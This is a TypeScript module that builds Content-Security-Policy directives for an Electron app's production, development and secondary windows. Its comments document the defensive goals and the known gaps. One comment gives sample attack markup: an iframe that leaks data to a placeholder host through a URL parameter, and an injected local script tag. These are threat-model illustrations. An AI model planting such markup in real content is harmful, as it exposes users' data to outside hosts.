/**
 * Content-Security-Policy for the renderer windows — a single, unit-testable
 * source of truth for both the packaged app and the dev server.
 *
 * This module is deliberately **electron-free and dependency-free** so it can be
 * imported by BOTH the Electron main process (runtime dev-server header) and the
 * `electron.vite.config.ts` renderer build (compile-time `<meta>` injection)
 * without dragging Electron into the build config's evaluation.
 *
 * Why a `<meta>` tag for production rather than an `onHeadersReceived` header:
 * the packaged renderer is loaded over `file://`, whose origin is opaque, so the
 * CSP keyword `'self'` does not reliably match sibling `file:` assets (the app
 * bundle, MathJax, the pdf.js worker). A `<meta http-equiv>` applies to the
 * document regardless of protocol, and we additionally allow the `file:` scheme
 * so the app's own assets always load. The dev server is plain `http://…`, where
 * `'self'` works and HMR needs `'unsafe-inline'`/`'unsafe-eval'` + a websocket —
 * hence a separate, looser dev policy applied as a response header.
 *
 * The security goal (defense-in-depth behind the sanitizer, closing the C1
 * stored-XSS → RCE class): production `script-src` has **no `'unsafe-inline'`**
 * (so an injected inline `onerror=` handler cannot run) and **no remote origins**
 * (so injected markup cannot pull attacker *script* from the network).
 * `'wasm-unsafe-eval'` permits WebAssembly (pdf.js) but NOT JavaScript `eval`.
 *
 * Known residual limits (documented honestly rather than overstated):
 *  - `script-src` includes the bare `file:` scheme because the packaged renderer
 *    and its assets live on `file://` and CSP cannot path-scope `file:`. That
 *    matches ANY local `.js`, so this is NOT a guarantee against a *future*
 *    sanitizer bypass injecting `<script src="file:///…/some-local.js">`. The
 *    robust upgrade is to serve the renderer from a custom privileged scheme
 *    (`protocol.handle('app', …)` + `registerSchemesAsPrivileged`) so `'self'`
 *    matches and `file:` can be dropped — deferred as its own change.
 *  - `frame-src http: https:` intentionally mirrors the notes sanitizer's opt-in
 *    `<iframe>` embeds. Remote iframes are therefore a possible *markup-only*
 *    exfiltration channel (`<iframe src="https://host/?leak=…">`); this is an
 *    accepted consequence of the embed feature, not closed by CSP.
 *
 * Directives the app legitimately needs:
 *  - `style-src 'unsafe-inline'` — React inline `style={{…}}`, MathJax's injected
 *    `<style>` + inline SVG styles, and the CodeMirror editor's runtime stylesheet.
 *  - `img-src data: blob:` — journal covers and PDF/attachment thumbnails are
 *    rendered from `URL.createObjectURL(Blob)` (blob:) and inline SVG (data:).
 *  - `worker-src blob:` — the pdf.js worker (bundled asset; blob fallback).
 *  - `frame-src http: https:` — the opt-in `<iframe>` embeds allowed in notes.
 */

/** Build the CSP policy string for the given renderer environment. */
export function contentSecurityPolicy(mode: 'prod' | 'dev', devOrigin = ''): string {
  if (mode === 'prod') {
    // NOTE: emitted as a <meta> tag, which ignores `frame-ancestors`/`sandbox`
    // (harmless for a desktop app that is never embedded), so those are omitted.
    return join([
      `default-src 'self' file:`,
      `script-src 'self' file: 'wasm-unsafe-eval'`,
      `style-src 'self' file: 'unsafe-inline'`,
      `img-src 'self' file: data: blob:`,
      `font-src 'self' file: data:`,
      `connect-src 'self' file:`,
      `worker-src 'self' file: blob:`,
      `frame-src http: https:`,
      `object-src 'none'`,
      `base-uri 'none'`,
      `form-action 'none'`,
    ]);
  }
  // Dev: the Vite dev server origin + HMR. Looser (inline/eval/websocket) so hot
  // reload works; this policy never ships. Empty devOrigin degrades to 'self'.
  const origin = devOrigin.trim();
  return join([
    `default-src 'self' ${origin}`,
    `script-src 'self' ${origin} 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval'`,
    `style-src 'self' ${origin} 'unsafe-inline'`,
    `img-src 'self' ${origin} data: blob:`,
    `font-src 'self' ${origin} data:`,
    `connect-src 'self' ${origin} ws: wss: data:`,
    `worker-src 'self' ${origin} blob:`,
    `frame-src http: https:`,
    `object-src 'none'`,
    `base-uri 'none'`,
    `form-action 'none'`,
  ]);
}

/**
 * CSP for the secondary, script-free documents the main process generates and
 * loads over `file://` — the Help manual and the Print sheet. Neither runs any
 * script or carries the preload bridge, so scripts are forbidden outright
 * (`default-src 'none'`); only inline styles (both embed a `<style>` block) and
 * passive images/fonts are permitted. Delivered as a `<meta>` tag in the
 * generated HTML, because `file://` responses do not reliably receive an
 * `onHeadersReceived` header. This is the CSP backstop the renderer's `<meta>`
 * gives the main window, extended to the two windows the build step never sees.
 */
export function secondaryWindowCsp(): string {
  return join([
    `default-src 'none'`,
    `style-src 'unsafe-inline'`,
    `img-src data: file: https:`,
    `font-src data: file:`,
    `base-uri 'none'`,
  ]);
}

/** Join directives with `; `, collapsing the doubled spaces an empty devOrigin leaves. */
function join(directives: string[]): string {
  return directives.map((d) => d.replace(/\s+/g, ' ').trim()).join('; ');
}
